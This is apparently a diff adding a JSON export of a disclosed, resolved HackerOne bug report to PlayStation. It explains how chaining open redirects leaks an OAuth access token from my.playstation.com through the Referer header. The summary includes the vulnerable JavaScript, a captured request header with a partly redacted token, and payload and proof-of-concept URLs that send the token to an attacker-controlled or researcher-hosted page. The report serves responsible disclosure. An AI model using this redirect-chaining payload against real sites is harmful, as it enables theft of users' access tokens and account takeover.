@@ -1,0 +1,149 @@
+{
+  "id": 835437,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzU0Mzc=",
+  "url": "https://hackerone.com/reports/835437",
+  "title": "Access Token Smuggling from my.playstation.com via Referer Header",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-31T16:45:03.608Z",
+  "submitted_at": "2020-03-31T16:45:03.608Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nnez",
+    "url": "/nnez",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4jrx5zafklv211q5txybqfei9z77/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 44879,
+    "url": "https://hackerone.com/playstation",
+    "handle": "playstation",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "PlayStation",
+      "twitter_handle": "PlayStation",
+      "website": "https://www.playstation.com",
+      "about": "Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-01-12T01:40:31.909Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-07T02:19:03.425Z",
+  "team_member_agreed_on_going_public_at": "2021-01-12T01:40:31.783Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 143,
+  "voters": [
+    "mole_concept",
+    "superpan",
+    "tokyoenigma",
+    "tcwr",
+    "oub3ll4",
+    "th3hidd3nmist",
+    "napoleon17",
+    "rootz491",
+    "datsuraku147",
+    "n1m0",
+    "and 133 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 40731,
+    "asset_type": "URL",
+    "asset_identifier": "my.playstation.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 26213,
+      "category": "team",
+      "content": "I discovered a way to smuggle an access token from my.playstation.com via Referer header through chain of open redirection vulnerability.  \n\nOn my investigation of authentication flow I found this endpoint with potential site for open redirect vulnerability\n\nhttps://my.playstation.com/auth/response.html\n\nLet's look at some part of the code on this endpoint.\n\n```\nfunction sendResponseToApp(a) {\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \"\",\n        e = a.returnRoute || \"\",\n        f = a.excludeQueryParams,\n        g = !f && window.location.search || \"\";\n    switch (b) {\n        case \"iframe\":\n            window.parent.postMessage(a, c);\n            break;\n        case \"window\":\n            window.opener.postMessage(a, c);\n            break;\n        case \"external\":\n        default:\n            var h = constructUrl(c, d, e) + g;\n            /^(https:\\/\\/)([a-z0-9\\-]+\\.)+(playstation\\.com)(:([0-9]){4})?\\//.test(h) ? window.location.href = h : window.location.href = \"https://playstation.com/error\"\n    }\n}\n```\n\nThis is a switch statement checking on variable named requestID\nThe interesting part for this report is the last condition where requestID is equal to \"external\".  \n\nThis condition basically says that if requestID is equal to \"external\" then construct URL from query parameters and redirect to that URL.  \nThere is also a regex filter to protect against Open Redirect. The target for redirection can only be a subdomain of playstation.com.  \n\nThe only way this is vulnerable to open redirect is that there is a sub-domain that is vulnerable to open redirect as well.  \nI spend sometimes hutning on that and I discovered an endpoint on docs.playstation.com that is vulnerable to open redirect.  \nHere is the endpoint I mentoined.\n\n`https://docs.playstation.com/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th`\n\nFollowing this endpoint a user will be redirected to authentication portal first, if already logged in, redirected back to\n\n`https://docs.playstation.com/consumers/auth/psn_oauth2/callback?code=${code}&state=${state}&cid=${cid}`\n\nThe above endpoint will consume the authorization code and then give back jwt access token (valid on docs.playstation.com only) and redirect user to *callback_url* with jwt token in query parameter.  \n\nAt first, I thought that this is an open redirect on out-scope domain, even if I can chain it with in-scope (which is the first endpoint I mentioned) it is not much a security threat.\n\nHowever, after code review and testing, I discovered a way to smuggle an access token from my.playstation.com via Referer header and send it to attacker site using this chain of redirection. **Here is how**.  \n\nInitially, I observed that when I chain said open redirect from my.playstation.com to docs.playstation.com then to attacker site, the Referer header contains the URL of my.playstation.com endpoint with some query parameters\n\nTry this yourself (you need to login on playstation network first, maybe on my.playstation.com)\n\n`https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th`\n\n```\nRequest Headers to google\n:authority: www.google.co.th\n:method: GET\n:path: /?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&consumer_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm92aWRlciI6InBzbl----redacted----zg0NjkxMzU2NjAwMjkwNDMwIiwiZXhwIjoxNTg2MjcwNjQ5fQ.8XXCliCQwBwussk9uNsA1Kiiqgn0vsyP-KUCGpQNMaw\n:scheme: https\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\naccept-encoding: gzip, deflate, br\naccept-language: th,en-US;q=0.9,en;q=0.8\nreferer: https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th\nsec-fetch-dest: document\nsec-fetch-mode: navigate\nsec-fetch-site: cross-site\nupgrade-insecure-requests: 1\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\n```\n\nNow let's go back to the purpose of this endpoint. (/auth/response.html)  \nIt is used to receive access token from auth.api.sonyentertainmentnetwork.com after user login\n\nAuthentication flow is like this.\n1.) Click sign-in button from my.playstation.com\n2.) Redirect to auth.api.sonyentertainmentnetwork.com with redirect_uri set to my.playstation.com/auth/response.html  \n3.) After login, (or if already logged in), redirect to redirect_uri with access_token in attached in hash fragment of the URL\n4.) Redirect back to my.playstation.com\n5.) iframe points to endpoint in 2.) is created, access_token is sent back to the page via postMessage function.\n\n**redirect_uri** is only being validated for its origin, so what comes after that is user-controllable.\n\nTherefore, I could use this URL\n`https://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.google.co.th` as the payload, if a user is already logged in, he/she will go through chain of redirection and finally get to google.\n\nTry it:  \n[https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize...callback_url=https://www.google.co.th](https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dexternal_request_3b961caf-d776-48bd-953e-fca6a0526d91%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fdocs.playstation.com%26returnRoute%3D%2Fconsumers%2Fauth%2Fpsn_oauth2%3Fcallback_url%3Dhttps%3A%2F%2Fwww.google.co.th)\n\nThe problem is that access token is stored in hash fragment which does not reflect on Referer header. To smuggle this access token I would need to find a way to make access token in query parameters instead of hash fragment.  \n\nI noticed that I could also put hash fragment in **redirect_uri** and the hash fragment on /auth/response.html would be  \n\n```\n#foo=bar&access_token=...&token_type=...\n```\n\nLet's look at the code responsible for extracting parameters from query string and hash fragment of the URL on this endpoint\n\n```\nfunction parseResponse(a) {\n    var b = a.hash.substr(1),\n        c = a.search.substr(1),\n        d = b + \"&\" + c,\n        e = convertToObject(d);\n    return e.refererURL = a.toString(), e\n}\n\nfunction convertToObject(a, b, c) {\n    b = b || \"&\", c = c || \"=\";\n    var d = a.indexOf(\"?\");\n    if (-1 !== d) {\n        var e = a.substr(d);\n        a = a.substr(0, d) + encodeURIComponent(e)\n    }\n    var f = {},\n        g = {};\n    return a.split(b).forEach(function (a) {\n        if (a = a.split(c), 2 === a.length) {\n            var b = decodeURIComponent(a[0]),\n                d = decodeURIComponent(a[1]);\n            \"state\" === b ? g = convertToObject(d, \"_._\", \"~~~\") : f[b] = d\n        }\n    }), union(f, g)\n}\n\nfunction union(a, b) {\n    var c, d = {};\n    for (c in a) d[c] = a[c];\n    for (c in b) d[c] = b[c];\n    return d\n}\nvar response = parseResponse(window.location);\n```\n\nIt puts hash fragment and query string together with `&` in-between then send it to convertToObject function to put all of variables and their values in key-value pair object.\n\nThe delimiters are **=** and **&** to split between key and value and key and key respectively.  \nThere is also a special condition in which the key name is **state**, it will go make key-value pair object from state's value using **_._** and **~~~** as delimiter.\n\nNow let's go back to the first code I provided `function sendResponseToApp` and consider how target URL is constructed.\n```\n    var b = extractFrameTypeFromRequestID(a.requestID),\n        c = a.targetOrigin || getOrigin(),\n        d = a.baseUrl || \"\",\n        e = a.returnRoute || \"\",\n        f = a.excludeQueryParams,\n        g = !f && window.location.search || \"\";\n    /// Some are removed to make it easier to read ///\n        var h = constructUrl(c, d, e) + g;\n```\nBasically, constructUrl is just concatenate value from c,d, e, and g together. The point is what is c, d, e, and g. It is quite straightforward that  \nc = targetOrigin, d = baseUrl, e = returnRoute and g = query strings  \n\nSo, primarily constructURL consists of  \ntargetOrgin + baseUrl + returnRoute + query strings  \n\nNow that we have reviewed the code necessary, let's get to how the exploit work.  \nAgain, the core idea is that I need to make access token in query strings instead of hash fragment so that it get reflected in Referer header.  \n\nBasic idea of how to do that,\n1.) Somehow put access token in returnRoute so that it is included in query string of target URL for redirection\n2.) Redirect to my.playstation.com/auth/response.html with access token in query string\n3.) Redirect again to docs.playstation.com then to attacker site.\n4.) Now Referer header contains access token.\n\nLet's go in detail  \nIn convertToObject function\n```\n    var d = a.indexOf(\"?\");\n    if (-1 !== d) {\n        var e = a.substr(d);\n        a = a.substr(0, d) + encodeURIComponent(e)\n    }\n```\nif there is **?** in string *d*, it will encode what comes after **?** before processing string *d* to make key-value pair object. \nan example of value in string *d* would be\n```\naccess_token=...&token_type=bearer&...key-value from query string\n```\n\nSo, if **redirect_uri** ends with `#returnRoute=/auth/response.html?`, the value in string *d* would be\n```\nreturnRoute=/auth/response.html?&access_token=...&token_type=bearer\n```\nand because there is **?**, what comes after that is encoded so string *d* will be changed to\n```\nreturnRoute=/auth/response.html?%26access_token%3D...%26token_type%3Dbearer\n```\nFrom code review above, this function uses **=** and **&** as delimiter, the access token will be included in returnRoute as query string.\n\nTo redirect to my.playstation.com just put `targetOrigin=https://my.playstation.com` before returnRoute\n```\n#targetOrigin=https://my.playstation.com&returnRoute=/auth/response.html?...\n```  \nand also add `excludeQueryParams=true` to not include query string again.\n\nFinal step, to redirect to docs.playstaion.com   \nIn parseResponse function, to make string *d*, it concatenates hash fragment and query string together with **&** in-between and it put query string behind hash fragment.  \n\nSo, if **redirect_uri** ends with the latest payload, all of query parameters would be put in returnRoute as well since **=** and **&** are all encoded and are all included in target URL.\n\nTo redirect to docs.playstation.com and to attacker site just put  \n`baseUrl=/&targetOrgin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.attacker.com` as query string of **redirect_uri**\n\nHere is the final payload\n```\nhttps://my.playstation.com/auth/response.html?requestID=external_request_3b961caf-d776-48bd-953e-fca6a0526d91&baseUrl=/&targetOrigin=https://docs.playstation.com&returnRoute=/consumers/auth/psn_oauth2?callback_url=https://www.attacker.com#targetOrigin=https://my.playstation.com&excludeQueryParams=true&returnRoute=/auth/response.html?\n```\n\n**Proof-of-Concept Link**\nhttps://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?response_type=token&scope=capone%3Areport_submission%2Ckamaji%3Agame_list%2Ckamaji%3Aget_account_hash%2Cuser%3Aaccount.get%2Cuser%3Aaccount.profile.get%2Ckamaji%3Asocial_get_graph%2Ckamaji%3Augc%3Adistributor%2Cuser%3Aaccount.identityMapper%2Ckamaji%3Amusic_views%2Ckamaji%3Aactivity_feed_get_feed_privacy%2Ckamaji%3Aactivity_feed_get_news_feed%2Ckamaji%3Aactivity_feed_submit_feed_story%2Ckamaji%3Aactivity_feed_internal_feed_submit_story%2Ckamaji%3Aaccount_link_token_web%2Ckamaji%3Augc%3Adistributor_web%2Ckamaji%3Aurl_preview&client_id=656ace0b-d627-47e6-915c-13b259cd06b2&redirect_uri=https%3A%2F%2Fmy.playstation.com%2Fauth%2Fresponse.html%3FrequestID%3Dexternal_request_3b961caf-d776-48bd-953e-fca6a0526d91%26baseUrl%3D%2F%26targetOrigin%3Dhttps%3A%2F%2Fdocs.playstation.com%26returnRoute%3D%2Fconsumers%2Fauth%2Fpsn_oauth2%3Fcallback_url%3Dhttps%3A%2F%2Fnnez-poc.000webhostapp.com%2Fc2ba5d6f36bf7572ab73644b97fee017.html%23targetOrigin%3Dhttps%3A%2F%2Fmy.playstation.com%26excludeQueryParams%3Dtrue%26returnRoute%3D%2Fauth%2Fresponse.html%3F\n\nIn PoC link, I redirect you to my website, it will automically extract access token from referer header.\n\n\n## Impact\n\nAn attacker is allowed to access victim's resources on my.playstation.com granted by stolen access token.\n",
+      "updated_at": "2021-01-12T01:38:29.070Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 319901,
+        "username": "serv",
+        "name": "s",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2018-07-30T18:21:23.048Z",
+        "url": "https://hackerone.com/serv",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
